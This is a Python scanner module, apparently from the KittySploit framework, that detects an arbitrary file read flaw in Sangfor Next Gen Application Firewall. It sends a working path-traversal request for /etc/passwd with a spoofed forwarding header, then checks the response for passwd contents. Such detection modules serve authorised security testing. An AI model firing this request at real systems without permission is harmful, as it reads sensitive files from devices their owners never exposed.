#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Sangfor Next Gen Application Firewall is susceptible to Local File Inclusion as it does not validate the file ."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sangfor Next Gen Application Firewall - Arbitary File Read Detection',
        'description': 'Sangfor Next Gen Application Firewall is susceptible to Local File Inclusion as it does not validate the file parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'sangfor', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/',
        ],
    }

    def run(self):
        path = '/svpn_html/loadfile.php?file=/etc/./passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'y-forwarded-for': '127.0.0.1'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('filename="passwd"', 'application/octet-stream',)
        body_regexes = ('root:[x*]:0:0',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='Sangfor Next Gen Application Firewall - Arbitary File Read detected', path=path)
            return True
        return False

